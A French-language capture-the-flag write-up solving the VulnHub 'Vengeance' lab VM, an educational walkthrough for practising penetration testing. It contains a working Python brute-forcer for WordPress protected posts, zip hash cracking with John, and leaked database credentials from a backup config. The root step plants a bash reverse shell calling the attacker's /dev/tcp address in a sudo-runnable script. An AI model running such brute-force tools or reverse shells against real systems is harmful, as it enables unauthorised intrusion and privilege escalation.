---
title: "Solution du CTF Vengeance de VulnHub"
tags: [CTF, VulnHub]
---

## Présentation

Bien décidé à continuer la série *digitalworld.local* créée par *Donavan*, je continue ici avec le CTF [Vengeance](https://vulnhub.com/entry/digitalworldlocal-vengeance,704/) téléchargeable sur VulnHub.

L'énumération a été laborieuse, d'abord à cause d'un service qui a mis du temps à se *déclarer* puis à cause d'instructions pas tout à fait claires.

J'ai ensuite galéré sur la fin, la cause vraisemblablement à la présence d'un pare-feu sur mon système.

```
Nmap scan report for 192.168.56.122
Host is up (0.00028s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE  SERVICE      VERSION
7/tcp     closed echo
22/tcp    closed ssh
80/tcp    open   http         nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: VENGEANCE &#8211; Confessions of a girl who has been cornered ...
|_auth-owners: www-data
88/tcp    closed kerberos-sec
110/tcp   open   pop3         Dovecot pop3d
|_auth-owners: dovenull
|_pop3-capabilities: TOP SASL RESP-CODES AUTH-RESP-CODE CAPA UIDL PIPELINING STLS
113/tcp   open   ident?
|_auth-owners: root
139/tcp   closed netbios-ssn
143/tcp   open   imap         Dovecot imapd (Ubuntu)
|_imap-capabilities: more IDLE ENABLE have post-login listed LOGINDISABLEDA0001 LITERAL+ LOGIN-REFERRALS Pre-login capabilities IMAP4rev1 OK ID SASL-IR STARTTLS
|_auth-owners: dovenull
161/tcp   closed snmp
389/tcp   closed ldap
443/tcp   open   ssl/http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|   h2
|_  http/1.1
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=VENGEANCE/organizationName=Good Tech Inc/stateOrProvinceName=Singapore/countryName=SG
| Not valid before: 2021-02-14T02:40:28
|_Not valid after:  2022-02-14T02:40:28
|_auth-owners: www-data
|_http-title: 400 The plain HTTP request was sent to HTTPS port
445/tcp   closed microsoft-ds
993/tcp   open   tcpwrapped
995/tcp   open   tcpwrapped
1337/tcp  closed waste
2049/tcp  closed nfs
6000/tcp  closed X11
8080/tcp  closed http-proxy
22222/tcp open   ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
|_auth-owners: root
| ssh-hostkey: 
|   3072 32eb05fad375455ec772fb03aa05b7d7 (RSA)
|   256 4016f8d1f106e5aa134428ede055ef34 (ECDSA)
|_  256 527815c23ba190203ab1d6759372d8f8 (ED25519)
54321/tcp closed unknown
MAC Address: 08:00:27:E0:DF:77 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Assez étonnant de trouver autant de ports fermés alors qu'ils semblent filtrés par défaut.

Sur le port 80 se trouve un Wordpress configuré pour le nom d'hôte `VENGEANCE.goodtech.inc` :

```html
<!doctype html>
<html lang="en-US" >
<head>
	<meta charset="UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<title>VENGEANCE &#8211; Confessions of a girl who has been cornered in love.</title>
<link rel='dns-prefetch' href='//VENGEANCE.goodtech.inc' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="VENGEANCE &raquo; Feed" href="http://VENGEANCE.goodtech.inc" />
<link rel="alternate" type="application/rss+xml" title="VENGEANCE &raquo; Comments Feed" href="http://VENGEANCE.goodtech.inc/?feed=comments-rss2" />
```

Sur le port 443 on trouve le même site, mais le certificat comporte un contact email :

```console
$ openssl s_client -connect 192.168.56.122:443
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 C = SG, ST = Singapore, L = Singapore, O = Good Tech Inc, OU = IT Department, CN = VENGEANCE, emailAddress = sara@goodtech.inc
--- snip ---
```

Le Wordpress semble être géré par l'utilisatrice `qinyi` mais on trouve des références à d'autres utilisateurs comme `qiu`, `sara`, `patrick` (que l'on a croisé sur les CTFs du même auteur). Je remarque aussi que l'un des posts du blog est protégé par un mot de passe.

Sur son blog, *Qinyi* parle de sa rupture avec un certain *Gio* (pour *Giovanni*).

J'ai fait une énumération des VHOSTs (envoyer des requêtes HTTP avec un entête `Host` différent) pour le domaine `goodtech.inc` mais ça n'a rien donné.

La solution logique est de lancer WPscan dans l'espoir de trouver un plugin vulnérable :

```console
$ docker run --add-host vengeance.goodtech.inc:192.168.56.122 -it --rm wpscanteam/wpscan --url http://vengeance.goodtech.inc/ -e ap,at,u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://vengeance.goodtech.inc/ [192.168.56.122]
[+] Started: Sat Mar 11 08:35:56 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.18.0 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://vengeance.goodtech.inc/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://vengeance.goodtech.inc/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://vengeance.goodtech.inc/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6.1 identified (Insecure, released on 2021-02-03).
 | Found By: Style Etag (Aggressive Detection)
 |  - http://vengeance.goodtech.inc/wp-admin/load-styles.php, Match: '5.6.1'
 | Confirmed By: Query Parameter In Install Page (Aggressive Detection)
 |  - http://VENGEANCE.goodtech.inc/wp-includes/css/dashicons.min.css?ver=5.6.1
 |  - http://VENGEANCE.goodtech.inc/wp-includes/css/buttons.min.css?ver=5.6.1
 |  - http://VENGEANCE.goodtech.inc/wp-admin/css/forms.min.css?ver=5.6.1
 |  - http://VENGEANCE.goodtech.inc/wp-admin/css/l10n.min.css?ver=5.6.1
 |  - http://VENGEANCE.goodtech.inc/wp-admin/css/install.min.css?ver=5.6.1

[+] WordPress theme in use: twentytwentyone
 | Location: http://vengeance.goodtech.inc/wp-content/themes/twentytwentyone/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://vengeance.goodtech.inc/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://VENGEANCE.goodtech.inc/wp-content/themes/twentytwentyone/style.css?ver=1.1
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://VENGEANCE.goodtech.inc/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating All Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:34 <==============================================================================================================================> (25378 / 25378) 100.00% Time: 00:00:34
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentytwentyone
 | Location: http://vengeance.goodtech.inc/wp-content/themes/twentytwentyone/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://vengeance.goodtech.inc/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://vengeance.goodtech.inc/wp-content/themes/twentytwentyone/style.css
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://vengeance.goodtech.inc/wp-content/themes/twentytwentyone/, status: 500
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://vengeance.goodtech.inc/wp-content/themes/twentytwentyone/style.css, Match: 'Version: 1.1'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <====================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] qinyi
 | Found By: Rss Generator (Passive Detection)

[+] Sara
 | Found By: Rss Generator (Passive Detection)

[+] Qiu
 | Found By: Rss Generator (Passive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 75 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Mar 11 08:36:41 2023
[+] Requests Done: 25443
[+] Cached Requests: 18
[+] Data Sent: 5.843 MB
[+] Data Received: 4.472 MB
[+] Memory used: 335 MB
[+] Elapsed time: 00:00:45
```

Pas de plugins détectés, pas terrible...

## Du nouveau dans la boîte à outs'

Intrigué par ce post protégé par mot de passe j'ai d'abord tenté de le brute-forcer simplement à l'aide de `ffuf` :

```bash
ffuf -X POST -u 'http://vengeance.goodtech.inc/wp-login.php?action=postpass' \
  -d 'post_password=FUZZ&Submit=Enter' -H 'Content-Type: application/x-www-form-urlencoded' \
  -H "Referer: http://vengeance.goodtech.inc/?p=23" -w dico.txt -r -fw 1077
```

Mais cela n'a mené nulle part. La cause principale, c'est que la réponse donnée par le serveur est la même que le mot de passe soit valide ou non : un code 302 redirigeant vers le post mentionné par l'entête `Referer`.

En théorie ça devrait marcher sauf que `ffuf` ne doit pas conserver les cookies d'une requête à l'autre.

Finalement j'ai écrit le code suivant :

```python
# Wordpress Passowrd-Protected Post brute force tool
# https://devl00p.github.io/ - 2023
import sys

import requests
from requests.exceptions import RequestException
from bs4 import BeautifulSoup

if len(sys.argv) < 2:
    print(f"Usage: python {sys.argv[0]} wp_post_url wordlist_file")
    sys.exit()

sess = requests.Session()
sess.timeout = 10

try: 
    response = sess.get(sys.argv[1])
except RequestException as err:
    print(f"Could not fetch webpage: {err}")
    sys.exit()

# Fetch the post URL to find where to submit the password
soup = BeautifulSoup(response.text, "html.parser")
form = soup.find("form", action=True, class_="post-password-form")
if not form:
    print("Can't find WP login URL!")
    sys.exit()

wp_login_url = form["action"]

print(f"Wordpress login URL is at {wp_login_url}")

# Now try with an invalid password to see how it behaves
response = sess.post(
    wp_login_url,
    data={"post_password": "thisisnotavalidpassword", "Submit": "Enter"},
    headers={"Referer": sys.argv[1]},
)

if 'class="post-password-form"' not in response.text:
    print("Expected behavior not found, can't brute-force")
    sys.exit()

# If everything is OK, perform the brute force
with open(sys.argv[2], encoding="utf-8", errors="ignore") as fd:
    for line in fd:
        password = line.strip()
        response = sess.post(
            wp_login_url,
            data={"post_password": password, "Submit": "Enter"},
            headers={"Referer": sys.argv[1]},
        )
        if 'class="post-password-form"' not in response.text:
            print(f"Found password {password}")
            sys.exit()
```

Couplé à ça, il faut disposer d'une wordlist. On peut la générer depuis les mots présents dans les pages du Wordpress mais je n'avais pas envie d'utiliser `Cewl` qui remonte trop de bruit.

J'ai donc écrit ce code suivant qui va récupérer les URLs des posts via le flux RSS puis extrait les mots présents en supprimant la ponctuation et découpe sur les whitespaces :

```python
# Extract words from a Wordpress blog. Utility for CTFs.
# https://devl00p.github.io/ - 2023
import sys                                                                                                             
from urllib.parse import urlparse, urlunparse                                                                          
import xml.etree.ElementTree as ET                                                                                     
import string                                                                                                          
                                                                                                                       
import requests                                                                                                        
from requests.exceptions import RequestException                                                                       
from bs4 import BeautifulSoup                                                                                          
                                                                                                                       
def extract_words(text):                                                                                               
    # Remove punctuation marks                                                                                         
    text = text.translate(str.maketrans('', '', string.punctuation))                                                   
    # Split into words                                                                                                 
    words = text.split()                                                                                               
    return words                                                                                                       
                                                                                                                       
if len(sys.argv) < 2:                                                                                                  
    print(f"Usage: python {sys.argv[0]} blog_url output_file")                                                         
    sys.exit()                                                                                                         
                                                                                                                       
parts = urlparse(sys.argv[1])                                                                                          
if not parts.scheme and not parts.netloc:                                                                              
    print("Invalid URL")                                                                                               
                                                                                                                       
path = parts.path                                                                                                      
if not path.endswith("/"):                                                                                             
    path += "/"                                                                                                        
blog_url = urlunparse((parts.scheme, parts.netloc, parts.path, '', '', ''))                                            
rss_url = blog_url + "?feed=rss2"                                                                                      
print(f"Fetching {rss_url} for list of posts")                                                                         
sess = requests.session()                                                                                              
sess.verify = False                                                                                                    
try:                                                                                                                   
    response = sess.get(rss_url, timeout=10)                                                                           
except RequestException as err:                                                                                        
    print(f"Could not fetch RSS: {err}")                                                                               
    sys.exit()


lines = set()                                                                                                          
root = ET.fromstring(response.text)                                                                                    
for link in root.findall("./channel/item/link"):                                                                       
    print(f"Fetching URL {link.text}")                                                                                 
    try:                                                                                                               
        response = sess.get(link.text, timeout=10)                                                                     
    except RequestException as err:                                                                                    
        print(f"Could not fetch URL: {err}")                                                                           
        continue                                                                                                       
                                                                                                                       
    content = BeautifulSoup(response.text, "html.parser").get_text(separator="\n", strip=True)                         
    lines.update(content.splitlines())                                                                                 
                                                                                                                       
words = set(extract_words(" ".join(lines)))                                                                            
                                                                                                                       
with open(sys.argv[2], "w", encoding="utf-8", errors="ignore") as fd:                                                  
    for word in words:                                                                                                 
        print(word, file=fd)
```

Il aura fallu ajouter une étape supplémentaire pour passer la wordlist en lowercase mais après ça fonctionnait :

```console
$ python3 brute_wp_post.py "http://vengeance.goodtech.inc/?p=23" dico.txt 
Wordpress login URL is at http://VENGEANCE.goodtech.inc/wp-login.php?action=postpass
Found password suzuka
```

Le post dévoilé ne nous apporte finalement rien de valeur...

## T'étais où, t'es pas là

Après avoir tourné sur les différents services pendant un moment, j'ai découvert que d'autres participants avaient droit à des ports en plus. Et effectivement si je relance `Nmap` :

```
139/tcp   open   netbios-ssn  Samba smbd 4.6.2
|_auth-owners: root
--- snip ---
445/tcp   open   netbios-ssn  Samba smbd 4.6.2
|_auth-owners: root
```

Arggggggh. On part donc sur cette piste.

```console
$ smbclient -U "" -N -L //192.168.56.122

        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        print$          Disk      Printer Drivers
        sarapublic$     Disk      Sara's Public Files
        IPC$            IPC       IPC Service (vengeance server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
$ smbclient -U "" -N '//192.168.56.122/sarapublic$'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar  8 11:28:35 2021
  ..                                  D        0  Mon Mar  8 11:29:24 2021
  eaurouge.txt                        N       11  Mon Mar  8 03:46:53 2021
  eaurouge                            N      110  Tue Feb 23 12:06:40 2021
  essay.txt                           N     1257  Mon Mar  8 11:28:34 2021
  gio.zip                             N 11150297  Sun Feb 21 06:48:13 2021
  cognac                              D        0  Tue Feb 23 18:48:47 2021
  blurb.txt                           N      525  Mon Mar  8 03:55:24 2021
  champagne                           D        0  Tue Feb 23 17:15:07 2021
  profile.txt                         N      337  Mon Mar  8 03:45:26 2021

                19475088 blocks of size 1024. 10495512 blocks available
```

L'archive *gio.zip* est protégée par mot de passe.

On a aussi différents fichiers dont voici les contenus :

* essay.txt

> One fine morning, I looked out of the window and saw the sun rise.  
> 
> It was a frenetic Friday. Amidst the warm sun rays projecting its glow through my room, there was a mad dash to solve a serious issue back at HQ. It felt eerily close.  
> 
> Our servers were hacked.  
> 
> We were in real trouble. The daydreaming had to stop. Without brushing my teeth, I stormed out of the house and prayed that it will all be OK.  
> 
> Except things were anything except OK. The attackers seemed to have taken control of our development domain. This was apocalyptic.  
> 
> The attackers managed to make away with our nanotechnological intellectual property. Additionally, the attackers deleted our latest development product, the ARCEUS X-FORCE. It was unknown if the attackers decid  
> ed to sell ARCEUS X-FORCE illegally.  
> 
> On closer inspection, we realised that this was an insider job. Govindasamy did an investigation, revealing that Qinyi was attempting to log into the development servers without prior permission. That was clear  
> ly a red flag, resulting in Govindasamy looking through her access rights.  
> 
> We discovered that, due to a misconfiguration, she had granted herself access rights that were otherwise not supposed to have been granted. We have since removed these access rights.



* blurb.txt

> Blurb about guards:  
> 
> How do you guard against a thief from the inside?  
> 
> Blurb about workers:  
> 
> Why do workers always set passwords related to their jobs?  
> 
> Blurb about security:  
> 
> Security has both "U" and "I" in it. Everyone must do their part!  
> 
> Blurb about passwords:  
> 
> Passwords are words that guard the pass.  
> 
> Blurb about nonsense:  
> 
> Sense is a subset of "nonsense"; all sensible talk, to others who don't understand, can be construed as nonsense.  
> 
> Blurb about trying harder:  
> 
> We all try harder in whatever we do. Try harder!



* profile.txt

> Draft profile for Giovanni:  
> 
> - worked in nanotechnological fields for 15 years  
> - hails from Milan  
> - worked on CNTs, graphene for device fabrication  
> - CEO of multiple nanotech firms in Tokyo, Singapore and Milan  
> - collaborating with Good Tech Inc. on R&D project  
> - keynote speaker of the "Good Tech Inc. Chip Fabrication Project" in 2019



* cognac/to-do 

> 1. compare between martell, remy martin, hennesey, courvoiser.  
> 
> 2. decide how we want to advertise the cognac brand we pick.  
> 
> 3. investigate why qinyi's looking into carbon nanotubes all of a sudden.

Il faut bien sûr utiliser `zip2john`, utilitaire présent dans la version communautaire de `John The Ripper` puis confronter `john` au hash généré. Ça n'a rien donné avec la wordlist du site donc on va extraire les mots des fichiers texte :

```python
import string

def extract_words(text):                                                                                               
    # Remove punctuation marks                                                                                         
    text = text.translate(str.maketrans('', '', string.punctuation))                                                   
    # Split into words                                                                                                 
    words = text.split()                                                                                               
    return words     

uniq_words = set()
for filename in ("essay.txt", "profile.txt"):
    with open(filename) as fd:
        words = extract_words(fd.read())
        uniq_words.update(words)

for word in uniq_words:
    if len(word) > 2:
        print(word)
```

Cette fois, on trouve le mot de passe :

```console
$ john --wordlist=wordlist.txt hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
nanotechnological (gio.zip)     
1g 0:00:00:00 DONE (2023-03-11 14:35) 50.00g/s 7600p/s 7600c/s 7600C/s Tech..teeth
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Il y a un fichier texte ainsi qu'une présentation PowerPoint. L'image est juste un troll.

```
pass_reminder.txt: ASCII text, with no line terminators
ted_talk.pptx:     Microsoft PowerPoint 2007+
tryharder.png:     PNG image data, 500 x 500, 8-bit/color RGBA, non-interlaced
```

Le reminder est le suivant : `name_corner_circuit`

Après avoir passé du temps sur le blog, on peut s'attendre à ce que le nom soit *Giovanni* et que le circuit soit *Suzuka* mais pour le virage ça reste à déterminer.

Il y a sur le blog certains indices :

> It was a brilliant sight at Monza. One of his favourite vantage points was the Parabolica, which was a sweeping corner. My boyfriend was cheering for Vettel, and me, for Verstappen

et

> Maybe I should just throw away all those pictures I had, especially when he threw a lavish party for me after the Suzuka GP. He said it was his favourite circuit.

J'ai donc tenté avec `giovanni_parabolica_suzuka` mais ça ne marchait pas.

Dans le fichier pptx on trouve le nom *Giovanni Berlusconi*. Faut-il utiliser le prénom ou le nom de famille ?

Il y a aussi une image d'un circuit de F1 avec une légende __Suzuka 130R_...

Finalement j'ai préféré chercher la solution ailleurs, car le mot de passe utilisait un nom capitalisé, un autre en minuscule et un autre en majuscules, ce qui rendait à mon goût cette partie trop compliquée (trop de guessing).

Le mot de passe est donc **giovanni_130R_Suzuka**.

## Take File, Transmit Promptly

Ce mot de passe permet de se connecter en SSH avec le compte `qinyi`.

```console
qinyi@vengeance:~$ cat reminder 
Diary 21/02/2021

1. Push config file to sara via private channel.

2. Change the password on our local account to stop reminding myself of Gio.

3. 


Diary 12/02/2021

1. Patch Wordpress. (DONE!)

2. Book a staycation @ St. Regis sometime in April.



Diary 10/02/2021

1. Purge the diary of previous entries. (DONE!)

2. Inform Patrick he needs to patch DEVELOPMENT server.
```

Il est mention d'un fichier de configuration, mais celui du Wordpress ne nous est pas lisible. On ne dispose pas non plus de droits en écriture qui pourraient permettre de récupérer un RCE en tant que `www-data` :

```console
qinyi@vengeance:/var/www/html$ cat wp-config.php
cat: wp-config.php: Permission denied
qinyi@vengeance:/var/www/html$ find . -writable 2> /dev/null
```

Je devine tout ce même en regardant les processus ce que le *private channel* signifie :

```
root         840  0.0  0.0   3032   128 ?        Ss   09:08   0:00 /usr/sbin/in.tftpd --listen --user root --address :69 --secure --create /home/sara/private
```

Mais que dois-je pousser sur ce TFTP ? En cherchant sous la racine web je trouve finalement un fichier de config :

```
/var/www/html/wp-content/aiowps_backups/backup.wp-config.php
```

Je peux lire ce dernier qui contient des identifiants valides pour la base MySQL :

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wpuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'P@ssT0MyD@t3' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

On obtient un hash qui est peut-être cassable :

```
mysql> select user_login, user_pass, user_email from vqvkj_users;
+------------+------------------------------------+--------------------+
| user_login | user_pass                          | user_email         |
+------------+------------------------------------+--------------------+
| qinyi      | $P$Bw9pCjgD.nFCKb31pNUvKoUl9N7vEI. | qinyi@goodtech.inc |
+------------+------------------------------------+--------------------+
1 row in set (0.00 sec)
```

Mais finalement je n'en aurais pas besoin, car je remarque une permission `sudo` qui autorise à exécuter un script présent dans le partage TFTP :

```console
qinyi@vengeance:~$ sudo -l
Matching Defaults entries for qinyi on vengeance:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User qinyi may run the following commands on vengeance:
    (root) NOPASSWD: /bin/systemctl restart nginx, /home/sara/private/eaurouge
```

On peut déjà récupérer le fichier pour voir à quoi il ressemble :

```bash
atftp --trace --get --remote-file eaurouge --local-file sara_eaurouge 192.168.56.122 69
```

J'ai dû le dumper depuis une capture `Wireshark` comme la dernière fois :| Il ne contient rien de critique :

```bash
#!/bin/bash

touch /home/sara/public/test.txt

echo "Test file" > /home/sara/public/test.txt

chown sara:sara /home/sara/public/test.txt

chmod 644 /home/sara/public/test.txt
```

Il faut alors uploader une version modifiée de `eaurouge` telle que ce script :

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.56.1/9999 0>&1
```

J'ai mis du temps à parvenir à faire fonctionner l'upload. Visiblement la communication était en partie bloquée par mon pare-feu. En branchant un _Kali Linux_ sur le même réseau privé hôte et en uploadant depuis cette machine c'est passé.

Il ne reste alors qu'à appeler `sudo /home/sara/private/eaurouge` et réceptionner notre shell :

```console
$ ncat -l -p 9999 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.56.122.
Ncat: Connection from 192.168.56.122:40342.
root@vengeance:/home/qinyi# id
id
uid=0(root) gid=0(root) groups=0(root)
root@vengeance:/home/qinyi# cd /root
cd /root
root@vengeance:~# ls
ls
proof.txt
snap
vengeance.crt
vengeance.key
root@vengeance:~# cat proof.txt
cat proof.txt
Root access obtained!

Congratulations on breaking through the 6th box in the digitalworld.local series. Hope you enjoyed this one
```

Comme dit plus tôt la partie énumération et obtention du mot de passe avait un peu trop de guessing. La suite aurait été plus sympathique sans les problèmes qui m'étaient spécifiques.
